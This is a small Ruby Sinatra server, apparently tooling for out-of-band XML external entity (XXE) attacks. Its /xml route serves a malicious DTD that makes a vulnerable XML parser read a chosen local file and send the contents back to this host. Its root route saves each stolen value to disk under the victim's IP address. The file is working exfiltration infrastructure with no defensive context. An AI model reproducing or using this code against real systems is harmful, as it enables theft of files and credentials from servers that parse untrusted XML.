#!/usr/bin/env ruby

require 'sinatra'

get "/" do
  return "OHAI" if params[:p].nil?
  f = File.open("./files/#{request.ip}#{Time.now.to_i}","w")
  f.write(params[:p])
  f.close
  ""
end

get "/xml" do
  return "" if params[:f].nil?

<<END  
<!ENTITY % payl SYSTEM "file://#{params[:f]}">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://#{request.host}:#{request.port}/?p=%payl;'>">
END
end
